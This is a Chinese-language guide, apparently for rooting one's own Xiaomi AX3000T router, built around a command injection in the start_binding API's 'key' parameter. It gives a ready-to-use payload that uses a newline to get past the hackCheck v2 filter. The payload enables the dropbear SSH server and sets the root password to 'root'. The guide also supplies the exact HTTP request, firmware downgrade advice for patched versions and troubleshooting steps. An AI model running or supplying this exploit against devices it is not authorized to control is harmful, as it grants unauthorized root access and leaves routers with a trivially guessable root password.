# AX3000T SSH 注入 — start_binding 方法

## 概述

AX3000T 通过 `start_binding` API 的 `key` 参数进行命令注入来启用 SSH。
这与 AX5/AX6 使用的 `set_config_iotdev` ssid 注入方法**完全不同**。

## 漏洞原理

`/api/xqsystem/start_binding` 的 `key` 参数值被传入 shell 命令时未做转义。
hackCheck version 2 过滤了 `;` 和 `|`，但 `\n`（换行符）可以绕过。

## 注入 payload

```python
items = [
    r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
    r"nvram set ssh_en=1",
    r"nvram set boot_wait=on",
    r"nvram commit",
    r"echo -e 'root\nroot' > /tmp/psw.txt",
    r"passwd root < /tmp/psw.txt",
    r"/etc/init.d/dropbear enable",
    r"/etc/init.d/dropbear restart",
]
cmds = "\n".join(items)
key_payload = "1234' -X \n" + cmds + "\n logger -t X 'X"
```

## HTTP 请求

```
GET /cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding?uid=1234&key={payload}
```

URL 编码后发送。路由器返回 `{"code": 0}` 表示注入已接收。

## 注入命令说明

| 命令 | 作用 |
|------|------|
| `sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear` | 解除 dropbear 的 release 检查 |
| `nvram set ssh_en=1` | NVRAM 启用 SSH |
| `nvram set boot_wait=on` | 启用 boot_wait |
| `nvram commit` | 提交 NVRAM |
| `echo -e 'root\nroot' > /tmp/psw.txt` | 写入密码文件 |
| `passwd root < /tmp/psw.txt` | 设 root 密码为 root |
| `/etc/init.d/dropbear enable` | 启用 dropbear 服务 |
| `/etc/init.d/dropbear restart` | 重启 dropbear |

## 与 AX5 的差异

| 维度 | AX5 (set_config_iotdev) | AX3000T (start_binding) |
|------|------------------------|------------------------|
| API 端点 | `/api/misystem/set_config_iotdev` | `/api/xqsystem/start_binding` |
| 注入字段 | `ssid` | `key` |
| 注入格式 | `\n<cmd>\n` | `1234' -X \n<cmds>\n logger -t X 'X` |
| 绕过机制 | ssid 值写入配置文件 | `\n` 替代 `;` 绕过 hackCheck v2 |
| 命令长度限制 | ~30 字节/条（需分块） | **无严格限制**（一次发送） |
| 注入次数 | 多次（每条一次 API） | **一次**（所有命令拼接） |

## SSH 连接

注入成功后（无需重启，秒级就绪）：

```bash
sshpass -p 'root' ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1
```

## 版本依赖

`start_binding` 注入在固件 `1.0.64` 上实测可用。
如果新固件修补了此漏洞，需先降级到 `1.0.47` 再注入。

## 错误处理

| 现象 | 原因 | 解决 |
|------|------|------|
| hackCheck 返回 nil | payload 含被过滤字符 | 确保用 `\n` 替代 `;` |
| SSH 端口未打开 | dropbear release 检查未解除 | 检查 sed 命令是否生效 |
| stok 过期 | stok 有时效性 | 重新登录获取新 stok |
